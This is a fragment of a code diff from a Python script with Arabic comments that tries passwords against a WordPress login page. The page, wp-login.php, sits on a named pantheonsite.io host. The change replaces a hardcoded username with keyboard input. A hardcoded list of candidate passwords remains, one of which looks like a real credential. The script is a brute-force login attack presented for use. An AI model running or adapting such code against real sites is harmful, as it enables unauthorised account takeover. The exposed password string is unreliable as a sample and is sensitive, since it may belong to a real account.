@@ -22,7 +22,7 @@ def main():
   يُشغّل السكربت ويحاول اختراق كلمة المرور باستخدام كلمات المرور المحددة.
   """
   url = "https://dev-learnwithtawfik.pantheonsite.io/wp-login.php"  # استبدل ب URL موقع ووردبريس المُستهدف
-  username = "123"  # استبدل باسم المستخدم المُستخدم
+  username = input("write username :")  # استبدل باسم المستخدم المُستخدم
   passwords = ["LZR^Dw4qjtX*^QBGdB", "pass.123d"]  # قائمة بكلمات المرور المُحتملة
 
   for password in passwords:
